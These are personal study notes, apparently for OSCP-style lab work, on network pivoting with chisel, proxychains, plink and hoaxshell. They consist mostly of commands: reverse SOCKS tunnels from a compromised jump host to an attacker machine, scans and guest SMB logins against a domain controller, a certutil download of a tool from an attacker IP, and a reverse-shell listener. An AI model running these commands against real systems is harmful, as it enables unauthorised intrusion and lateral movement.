### 24082023Thu

[A Powerful Pivoting Technique That the OSCP Doesn&#39;t Teach You - YouTube](https://youtu.be/dIqoULXmhXg)

https://www.youtube.com/@elevatecyber5031

https://www.kali.org/tools/chisel/

https://github.com/jpillora/chisel

```
ln -s /usr/local/bin/chisel chisel
```

```
chisel -h
```

```
nmap -Pn -n -p 88 192.168.237.103
```

 (Domain Controller IP)
 ![[Pasted image 20230824225909.png]]
 
```
88/tcp filtered kerberos-sec
```

```
chisel server -p 8000 --reverse
```

```
chisel client 192.168.237.102:8000 R:socks
```

```
sudo vim /etc/proxychains4.conf
```

![[Pasted image 20230824231727.png]]
![[Pasted image 20230824231843.png]]
#socks4

```
socks 127.0.0.1 1080
```

```
proxychains nmap -sT -p 88 -Pn -n 192.168.237.103
```

```
proxychains crackmapexec smb 192.168.237.103 -u 'guest' -p ''
```

```
https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
```

```
scp nmap username@ip:/tmp
```

```
scp chisel username@ip:/tmp
```

**In the attacker (kali) machine**

```
chisel server --socks5 --reverse
```

```
chisel server --socks5 --reverse
2023/09/15 22:05:53 server: Reverse tunnelling enabled
2023/09/15 22:05:53 server: Fingerprint wq+g4n5Ac8sFp9t9GwOLu7U6arED88bF2jfhH4IxV70=
2023/09/15 22:05:53 server: Listening on http://0.0.0.0:8080
```

**In the compromised pivot (jump host) machine**

```
./chisel client --fingerprint wq+g4n5Ac8sFp9t9GwOLu7U6arED88bF2jfhH4IxV70= [attacker's machine IP]:8080 R:8000:[other's machine IP]:80
```

```
./chisel client --fingerprint wq+g4n5Ac8sFp9t9GwOLu7U6arED88bF2jfhH4IxV70= kaliIP:8080 0.0.0.0:9999:kaliIP:9999
```

**In the kali's web browser**

http://localhost:8000

```
proxychains curl http://other's machine IP
```

```
proxychains xfreerdp /v:ip /u:Administrator
```

```
python hoaxshell.py -s other's machine IP -p 9999
```

```
powershell -e
```

```
plink.exe -ssh -L <local_port>:<destination_host>:<destination_port> <username>@<ssh_server>
```

```
plink.exe -ssh -L 8080:localhost:80 user@ssh_server
```

```
certutil -urlcache -f http://10.10.14.33/chisel_1.9.1_windows_386 chisel
```

```
chisel server -p 12312 --reverse
```

```
.\chisel.exe client 10.10.14.33:12312 R:445:127.0.0.1:445
```

![](Pasted%20image%2020230925171742.png)

![](Pasted%20image%2020230925171812.png)

```
ss -tulwn
```

